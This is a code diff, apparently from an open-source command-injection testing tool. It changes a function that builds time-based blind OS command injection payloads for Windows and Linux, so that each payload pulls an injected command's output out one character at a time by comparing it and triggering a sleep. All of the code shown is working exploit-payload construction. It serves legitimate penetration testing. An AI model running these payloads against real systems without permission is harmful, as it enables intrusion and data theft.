@@ -494,7 +494,9 @@ def get_char(separator, cmd, num_of_chars, ascii_char, timesec, http_request_met
 """
 __Warning__: The alternative shells are still experimental.
 """
-def get_char_alter_shell(separator, cmd, num_of_chars, ascii_char, timesec, http_request_method):
+def get_char_alter_shell(separator, cmd, num_of_chars, ascii_char, timesec, http_request_method, operator="-le"):
+  # Same bisection comparison by default as get_char() - validation re-probes with an equality operator.
+  win_operator = "GEQ" if operator == "-le" else "EQU"
   if settings.TARGET_OS == settings.OS.WINDOWS:
     python_payload = settings.WIN_PYTHON_INTERPRETER + " -c \"import os; print(ord(os.popen('" + cmd + "').read().strip()[" + str(num_of_chars-1) + ":" + str(num_of_chars) + "]))\""
     if separator in ("|", "||"):
@@ -502,7 +504,7 @@ def get_char_alter_shell(separator, cmd, num_of_chars, ascii_char, timesec, http
       payload = (pipe + settings.SINGLE_WHITESPACE +
                 "for /f \"tokens=*\" %i in ('cmd /c " +
                 python_payload +
-                "') do if %i==" + str(ascii_char) + settings.SINGLE_WHITESPACE +
+                "') do if %i " + win_operator + settings.SINGLE_WHITESPACE + str(ascii_char) + settings.SINGLE_WHITESPACE +
                 "cmd /c " + settings.WIN_PYTHON_INTERPRETER + " -c \"import time; time.sleep(" + str(2 * timesec + 1) + settings.CMD_SUB_SUFFIX + "\""
                 )
 
@@ -511,7 +513,7 @@ def get_char_alter_shell(separator, cmd, num_of_chars, ascii_char, timesec, http
       payload = (ampersand + settings.SINGLE_WHITESPACE +
                 "for /f \"tokens=*\" %i in ('cmd /c " +
                 python_payload +
-                "') do if %i==" + str(ascii_char) + settings.SINGLE_WHITESPACE +
+                "') do if %i " + win_operator + settings.SINGLE_WHITESPACE + str(ascii_char) + settings.SINGLE_WHITESPACE +
                 "cmd /c " + settings.WIN_PYTHON_INTERPRETER + " -c \"import time; time.sleep(" + str(2 * timesec + 1) + settings.CMD_SUB_SUFFIX + "\""
                 )
     else:
@@ -522,7 +524,7 @@ def get_char_alter_shell(separator, cmd, num_of_chars, ascii_char, timesec, http
     if separator in (";", "%0a"):
       payload = (separator +
                  settings.RANDOM_VAR_GENERATOR + "=" + settings.CMD_SUB_PREFIX + settings.LINUX_PYTHON_INTERPRETER + " -c \"print(ord(\'" + settings.CMD_SUB_PREFIX + "echo " + settings.CMD_SUB_PREFIX + cmd + "))\'[" + str(num_of_chars-1) + ":" +str(num_of_chars)+ "]))\nexit(0)\"" + settings.CMD_SUB_SUFFIX + separator +
-                 "if [ " + str(ascii_char) + " -eq ${" + settings.RANDOM_VAR_GENERATOR + "} ]" + separator +
+                 "if [ " + str(ascii_char) + settings.SINGLE_WHITESPACE + operator + settings.SINGLE_WHITESPACE + "${" + settings.RANDOM_VAR_GENERATOR + "} ]" + separator +
                  "then " + settings.CMD_SUB_PREFIX + settings.LINUX_PYTHON_INTERPRETER + " -c \"import time\ntime.sleep(" + str(timesec) + settings.CMD_SUB_SUFFIX + "\"" + settings.CMD_SUB_SUFFIX + separator +
                  "fi"
                  )
@@ -532,16 +534,17 @@ def get_char_alter_shell(separator, cmd, num_of_chars, ascii_char, timesec, http
       payload = (ampersand +
                  settings.CMD_SUB_PREFIX + settings.LINUX_PYTHON_INTERPRETER + " -c \"import time\ntime.sleep(0)\") " + separator +
                  settings.RANDOM_VAR_GENERATOR + "=" + settings.CMD_SUB_PREFIX + settings.LINUX_PYTHON_INTERPRETER + " -c \"print(ord(\'" + settings.CMD_SUB_PREFIX + "echo " + settings.CMD_SUB_PREFIX + cmd + "))\'[" + str(num_of_chars-1) + ":" +str(num_of_chars)+ "]))\nexit(0)\"" + settings.CMD_SUB_SUFFIX + separator +
-                 "[ " + str(ascii_char) + " -eq ${" + settings.RANDOM_VAR_GENERATOR + "} ] " + separator +
-                 settings.CMD_SUB_PREFIX + settings.LINUX_PYTHON_INTERPRETER + " -c \"import time\ntime.sleep(" + str(timesec) + settings.CMD_SUB_SUFFIX + "\"" + settings.CMD_SUB_SUFFIX  
+                 "[ " + str(ascii_char) + settings.SINGLE_WHITESPACE + operator + settings.SINGLE_WHITESPACE + "${" + settings.RANDOM_VAR_GENERATOR + "} ] " + separator +
+                 settings.CMD_SUB_PREFIX + settings.LINUX_PYTHON_INTERPRETER + " -c \"import time\ntime.sleep(" + str(timesec) + settings.CMD_SUB_SUFFIX + "\"" + settings.CMD_SUB_SUFFIX
                  )
-      
+
 
     elif separator == "||" :
       pipe = "|"
+      # Inverted to -gt (like get_char()'s "||" branch): "||" only runs sleep when this test fails.
       payload = (pipe +
-                 "[ " + str(ascii_char) + " -ne " + settings.CMD_SUB_PREFIX + settings.LINUX_PYTHON_INTERPRETER + " -c \"print(ord(\'" + settings.CMD_SUB_PREFIX + "echo " + settings.CMD_SUB_PREFIX + cmd + "))\'[" + str(num_of_chars-1) + ":" +str(num_of_chars)+ "]))\nexit(0)\") ] " + separator +
-                 settings.CMD_SUB_PREFIX + settings.LINUX_PYTHON_INTERPRETER + " -c \"import time\ntime.sleep(0)\") " + pipe + settings.CMD_SUB_PREFIX + settings.LINUX_PYTHON_INTERPRETER + " -c \"import time\ntime.sleep(" + str(timesec) + settings.CMD_SUB_SUFFIX + "\"" + settings.CMD_SUB_SUFFIX  
+                 "[ " + str(ascii_char) + " -gt " + settings.CMD_SUB_PREFIX + settings.LINUX_PYTHON_INTERPRETER + " -c \"print(ord(\'" + settings.CMD_SUB_PREFIX + "echo " + settings.CMD_SUB_PREFIX + cmd + "))\'[" + str(num_of_chars-1) + ":" +str(num_of_chars)+ "]))\nexit(0)\") ] " + separator +
+                 settings.CMD_SUB_PREFIX + settings.LINUX_PYTHON_INTERPRETER + " -c \"import time\ntime.sleep(0)\") " + pipe + settings.CMD_SUB_PREFIX + settings.LINUX_PYTHON_INTERPRETER + " -c \"import time\ntime.sleep(" + str(timesec) + settings.CMD_SUB_SUFFIX + "\"" + settings.CMD_SUB_SUFFIX
                  )
 
     else:
